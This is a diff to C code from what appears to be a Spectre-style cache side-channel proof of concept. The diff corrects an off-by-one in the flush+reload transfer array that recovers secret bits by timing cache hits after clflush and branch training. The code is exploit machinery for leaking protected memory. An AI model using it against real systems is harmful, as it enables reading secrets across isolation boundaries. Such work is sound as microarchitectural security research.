@@ -72,11 +72,11 @@ bool is_cached(uint8_t *address, size_t threshold)
 }
 
 uint32_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len,
-                        uint8_t secret, uint8_t channel[NUMBER_TRANSFER_BITS]),
+                        uint8_t secret, uint8_t channel[(NUMBER_TRANSFER_BITS + 1) * CACHE_LINE_SIZE]),
          uint8_t *in, uint32_t in_len, uint8_t *out, uint32_t out_len, size_t threshold)
 {
     // creating transfer array
-    uint8_t side_channel[NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE];
+    uint8_t side_channel[(NUMBER_TRANSFER_BITS + 1) * CACHE_LINE_SIZE];
     uint32_t out_index = 0;
     bool training;
 
@@ -93,7 +93,7 @@ uint32_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     for (uint32_t data_index = 0; data_index < in_len && data_index < out_len; data_index++)
     {
         // flushing the transfer array, before encoding data into it
-        memset(side_channel,5, NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE);
+        memset(side_channel,5, (NUMBER_TRANSFER_BITS + 1) * CACHE_LINE_SIZE);
 
         for (uint32_t i; i < TRAIN_DATA_LENGTH * CACHE_LINE_SIZE; i++)
             clflush(&train_data[i]);
@@ -105,7 +105,7 @@ uint32_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
             //printf("Training: %d\n", training);
         }
 
-        for (uint32_t i = 0; i < NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE; i += CACHE_LINE_SIZE)
+        for (uint32_t i = 0; i < (NUMBER_TRANSFER_BITS + 1) * CACHE_LINE_SIZE; i += CACHE_LINE_SIZE)
             clflush(&side_channel[i]);
 
         maccess(&in[data_index]);
@@ -120,14 +120,14 @@ uint32_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
         char binaryResult[NUMBER_TRANSFER_BITS + 1];
         memset(binaryResult, 0, NUMBER_TRANSFER_BITS + 1);
         // reading data from the side channel array
-        for (uint32_t i = 0; i < NUMBER_TRANSFER_BITS; i++)
+        for (uint32_t i = 1; i < NUMBER_TRANSFER_BITS + 1; i++)
         {
             if (is_cached(side_channel + (i * CACHE_LINE_SIZE), threshold)){
-                out[data_index] += DOUBLE_TIMES(1, i % 8);
-                binaryResult[i] = '1';
+                out[data_index] += DOUBLE_TIMES(1, (i-1) % 8);
+                binaryResult[i-1] = '1';
             }
             else {
-                binaryResult[i] = '0';
+                binaryResult[i-1] = '0';
             }
         }
         printf("%s\n", binaryResult);
